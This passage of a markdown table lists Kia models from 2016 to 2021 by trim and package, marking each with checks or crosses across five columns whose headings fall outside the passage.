| 2021 TELLURIDE SX (Prestige + Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE SX (Black Ed, Prestige + Tow Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE SX (Prestige Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE SX (Std) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE SX (Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 FORTE EX (Special Edition) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 FORTE GT (GT2) (Auto Climate) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 FORTE EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 FORTE GT-Line (Premium) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 FORTE GT-Line (Premium, Auto Climate) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 FORTE GT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 FORTE GT (Auto Climate) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 FORTE GT (GT2) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 CADENZA Limited | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 CADENZA Technology | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 K900 Luxury | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 NIRO EV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 NIRO EV EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 NIRO PHEV LXS | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 NIRO PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 NIRO PHEV EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 NIRO EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 NIRO Touring Special Edition | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 NIRO Touring | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 OPTIMA EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 OPTIMA PHEV EX (Technology Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 SEDONA EX (Premium Pkg, Rear Seat Ent. ) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 SEDONA EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 SEDONA EX (Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 SEDONA EX (Rear Seat Ent.) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 SEDONA SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2020 SEDONA SX (Rear Seat Ent.) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2020 RIO S (4D/Tech. Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 RIO S (5D/Tech. Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 SOUL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 SOUL EX (Designer) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 SOUL GT 1.6L Turbo | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 SORENTO SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 SPORTAGE EX (Technology Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 SPORTAGE S (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 SPORTAGE SX Turbo (Beige) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 SPORTAGE SX Turbo (Std) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE EX (Premium + Tow Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE EX (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE S (8 Passenger) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE SX (Prestige Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE EX (Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE LX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE SX (Prestige + Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 TELLURIDE SX (Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2020 STINGER GT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 STINGER GT-Line | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2020 STINGER GT1 | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2020 STINGER GT2 | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 FORTE EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 FORTE S (Premium) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 FORTE EX (Launch) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 FORTE S | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 CADENZA Cadenza (Ltd) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 CADENZA Cadenza (Premium) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 CADENZA Cadenza (Technology) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 NIRO EX (Adv. Technology) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 NIRO EX (Premium) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 NIRO LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 NIRO LX (Adv. Tech) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 NIRO EX (Std) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 NIRO FE | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 NIRO S Touring | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 NIRO Touring | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 K900 Luxury | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 K900 Luxury (VIP) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO EV EX (Battery Heater) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO EV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO EV EX (Battery Heater, Wireless Charger) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO EV EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO EV EX Premium (Battery Heater) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO EV EX Premium (Launch Ed.) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO EV EX Premium (Launch Ed., Battery Heater) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO PHEV EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 NIRO PHEV LX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 OPTIMA EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 OPTIMA EX (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 OPTIMA EX AT (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 OPTIMA LX AT (Premium) | ✅️ | ✅️ | ❌ | ✅️ | ❌ |
| 2019 OPTIMA S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 OPTIMA SX Turbo | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 OPTIMA SX Turbo (Ltd) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 OPTIMA HYBRID EX (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 OPTIMA PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 OPTIMA PHEV EX (Technology Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 RIO S AT(4D/Technology Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 RIO S AT(5D/Technology Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SEDONA EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SEDONA EX (Premium + Rear Ent.) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SEDONA EX (Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SEDONA EX AT (Rear Ent. Sys) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SEDONA S (Rear Ent. Sys) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SEDONA SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SORENTO EX Sport | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SORENTO EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SORENTO EX (Touring Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SORENTO Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SORENTO EX (Touring) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SORENTO LX (Convenience) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SORENTO SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SOUL LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SOUL Exclaim | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SOUL Plus | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SPORTAGE EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SPORTAGE EX (Sports Appearance Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SPORTAGE EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SPORTAGE EX (Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SPORTAGE LX (Popular Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 SPORTAGE SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SPORTAGE SX (Turbo Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 SOUL EV Soul EV | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 SOUL EV Soul EV+ | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2019 STINGER GT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 STINGER Premium | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 STINGER GT1 | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 STINGER GT2 | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 STINGER GTS | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2019 STINGER Stinger | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2019 STINGER Stinger (Sun and Sound) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 CADENZA Cadenza (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 CADENZA Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 CADENZA Premium (Luxury + Technology) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 FORTE EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 FORTE EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 FORTE EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 FORTE LX (Popular Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 FORTE LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 FORTE SX AT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 FORTE S | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 FORTE SX MT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 NIRO LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 NIRO EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 NIRO EX (Technology Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 NIRO EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 NIRO EX (Touring Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 NIRO FE | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 NIRO Touring | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 NIRO PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2018 NIRO PHEV EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2018 NIRO PHEV LX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2018 OPTIMA LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA S (Convenience) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA EX (Premium) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA LX (Convenience) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA LX Turbo | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA S | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA SX Turbo | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA SX Turbo (Limited Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA SX Turbo (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA HYBRID LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA HYBRID EX (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA HYBRID EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 OPTIMA HYBRID LX (Convenience) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 RIO EX (4D) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 RIO EX (5D) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SEDONA LX (Essentials + Adv Technology Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SEDONA EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SEDONA LX (Essentials Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SEDONA Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SEDONA SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO EX (Touring Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO EX Turbo | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO EX Turbo (Touring Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO LX (Convenience) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SORENTO SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SOUL Exclaim AT (std + IP2) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SOUL Plus AT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SOUL Base AT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SOUL Exclaim AT (SNS + TWS) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SOUL Plus AT (UVO + AU + Primo) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SOUL Plus AT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SOUL Plus AT (UVO + AU) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SOUL EV Soul EV | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2018 SOUL EV Soul EV+ | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2018 SPORTAGE EX (Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SPORTAGE EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SPORTAGE EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 SPORTAGE LX (Popular Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 SPORTAGE SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 STINGER GT1 | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 STINGER GT | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 STINGER GT2 | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2018 STINGER LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2018 STINGER Premium | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 CADENZA Premium (Luxury + Technology) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 CADENZA Cadenza (Ltd) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 CADENZA Cadenza (Premium) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE S | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE SX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE SX (Premium Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE EX (Premium Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE LX (Popular Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE S (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE S (Technology Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE KOUP EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE KOUP SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 FORTE KOUP SX (Manual Transmission) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 K900 Luxury V8 | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2017 K900 Luxury V8 (VIP Plus) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2017 K900 Luxury | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2017 K900 Luxury (VIP) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2017 K900 Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2017 NIRO EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 NIRO FE | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 NIRO LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 NIRO Touring | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA LX Turbo (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA LX Turbo (Value) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA Limited Turbo | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA SX Turbo | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA SX Turbo (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA SX Turbo (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA HYBRID LX (Convenience) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA HYBRID EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA HYBRID EX (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA HYBRID LX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 RIO EX (4D/Eco) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 RIO EX (5D/Eco) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 RIO SX (5D) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 OPTIMA PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2017 SEDONA EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SEDONA EX (Adv Technology Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SEDONA LX (Essentials + Adv Technology Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SEDONA LX (Essentials Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SEDONA LX (UVO Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SEDONA Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SEDONA SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SEDONA SX (Adv Touring Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SORENTO EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SORENTO LX (Convenience + Essentials Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SORENTO EX (Touring Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SORENTO Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SORENTO LX (Convenience + Adv Technology Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SORENTO LX (Convenience) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SORENTO SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SOUL Exclaim | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SOUL Exclaim (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SOUL Plus AT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SOUL Plus AT (UVO + AU + Primo + S10) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SOUL Plus AT (UVO + AU + Primo) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SOUL Plus AT (UVO + AU) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SOUL EV Soul EV | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2017 SOUL EV Soul EV+ | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2017 SPORTAGE LX (Popular Pkg + Cool Connected Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SPORTAGE EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SPORTAGE EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2017 SPORTAGE EX (Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2017 SPORTAGE SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 CADENZA Premium (Luxury + Technology) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 CADENZA Cadenza (Std) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 CADENZA Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 CADENZA Premium (Luxury) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 FORTE EX (Premium Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 FORTE EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 FORTE EX (Premium Plus Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 FORTE SX (Premium Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 FORTE KOUP EX (Premium Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 FORTE KOUP SX (Premium Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 K900 Luxury | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2016 K900 Luxury (VIP) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2016 K900 Luxury V8 | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2016 K900 Luxury V8 (VIP Plus) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2016 K900 Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2016 K900 Premium(IHP) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2016 K900 Luxury V8 (WV2,CPL) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2016 K900 Premium(Std) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2016 OPTIMA EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA LX Turbo (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA Limited Turbo | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA SX Turbo | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA SX Turbo (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA SX Turbo (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA HYBRID LX (Convenience) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA HYBRID EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 OPTIMA HYBRID EX (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 RIO EX (4D/Eco) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 RIO EX (5D/Eco) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 RIO SX (4D) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 RIO SX (5D) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SEDONA EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SEDONA EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SEDONA LX (Convenience) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SEDONA Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SEDONA SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SEDONA SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SORENTO EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SORENTO EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SORENTO Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SORENTO EX (Premium Pkg + Touring Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SORENTO LX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SORENTO LX (Convenience) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SORENTO SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SOUL Plus (Audio Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SOUL Exclaim | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SOUL Exclaim (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SOUL Plus (Primo Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SOUL Plus (Signature 2.0 Sp. Ed.) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SOUL Plus (Special Edition) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SOUL EV Soul EV | ✅️ | ✅️ | ✅️ | ❌ | ❌ |
